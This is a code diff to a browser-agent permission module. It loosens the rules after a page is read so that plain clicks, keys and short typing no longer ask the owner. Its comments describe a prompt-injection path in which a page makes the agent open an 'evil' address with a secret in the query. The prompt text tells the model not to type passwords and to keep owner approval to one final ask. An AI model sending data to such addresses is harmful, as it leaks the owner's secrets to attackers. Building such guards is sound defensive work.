@@ -9,14 +9,15 @@ import { judge } from './guard.js';
 //   browserPath: a Chrome/Chromium binary (default: Playwright's Chromium), proxy: e.g. socks5://127.0.0.1:1080
 // Reading pages (text, links, shot) runs freely (public pages only, checked in code). The owner's
 // logins live in this profile, so a click can send mail as the owner. Therefore:
-// - Reading a page taints the conversation. From then on every step that changes something
-//   (click, type, press, ...) asks the owner, and open runs freely only for an address that can
+// - Reading a page taints the conversation. From then on a step that acts still asks, long typing
+//   asks, and open runs freely only for an address that can
 //   carry nothing out (plainUrl): else a page could have the agent open https://evil/?d=<secret>.
 // - Before that, a step runs freely unless it really acts (send, pay, book, a form's submit
 //   button, a key like Enter): judged by the element it hits on the live page, not by the words.
 const HERE = path.dirname(fileURLToPath(import.meta.url));
 const STEPS = /^mcp__browse__(click|type|press|select|upload|submit)$/;
 const TICKET_MS = 2 * 60_000;
+const TAINT_TYPE_MAX = 60;
 const keyOf = (action, i = {}) => JSON.stringify([action, i.target ?? null, i.text ?? null, i.key ?? null]);
 const actionOf = (tool) => tool.slice('mcp__browse__'.length);
 
@@ -63,7 +64,9 @@ export default function browse(config, { chromium, check } = {}) {
     const el = /__(click|type)$/.test(tool) ? await browser.inspect(input.target).catch(() => null) : null;
     const verdict = judge(tool, input, browser.url, el);
     remember(key, { el, verdict, tainted });
-    if (tainted || verdict !== 'allow') return null; // the owner decides
+    // After a page was read, a step that does not act still runs freely, so a booking asks once, at
+    // the end. Typing stays short: a page's script sees what is typed before any submit.
+    if (verdict !== 'allow' || (tainted && /__type$/.test(tool) && String(input.text ?? '').length > TAINT_TYPE_MAX)) return null; // the owner decides
     freed.add(key);
     return { allow: true, reason: 'free' };
   }
@@ -100,7 +103,8 @@ export default function browse(config, { chromium, check } = {}) {
     routes: { '/browse': api },
     prompt: '## Browser\nUse mcp__browse__open/text/links/click/type/press/shot for websites (public pages only). Read text first; a screenshot only when layout matters. '
       + 'Name a link or button by its exact visible text. A page saying LOGIN NEEDED: ask the owner to log in themselves; never type passwords or card numbers. '
-      + 'After a page was read, clicks, typing and keys ask the owner, and so does opening an address with a query; a step that sends, pays or books always asks.',
+      + 'Plain clicks, short typing and keys run freely; a step that sends, pays, books or submits a form asks the owner, and so does opening an address with a query after a page was read. '
+      + 'That ask is the one question for the task: do not ask the same in the chat before it. Make it count: fill everything first, so the last click is the only ask.',
     browser,
     api,
     stop: () => browser.close(),
